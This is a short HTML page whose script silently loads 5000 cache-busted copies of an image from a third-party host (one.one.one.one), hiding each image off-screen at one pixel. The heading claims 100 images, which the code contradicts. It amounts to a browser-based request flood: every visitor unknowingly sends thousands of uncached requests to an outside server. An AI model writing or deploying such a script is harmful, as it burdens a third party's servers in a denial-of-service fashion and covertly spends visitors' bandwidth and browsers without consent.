<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hidden Image Loader</title>
  <style>
    .hidden-image {
      position: absolute;
      left: -9999px; /* Off-screen, but still visible to browser */
      top: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>
  <h1>Loading 100 Images Silently...</h1>
  <script>
    const totalImages = 5000;
    const baseUrl = 'https://one.one.one.one/media/card.png';
    const timestamp = Date.now();

    for (let i = 0; i < totalImages; i++) {
      const img = new Image();
      img.src = `${baseUrl}?cb=${timestamp}-${i}`;
      img.className = 'hidden-image';
      document.body.appendChild(img);
    }
  </script>
</body>
</html>
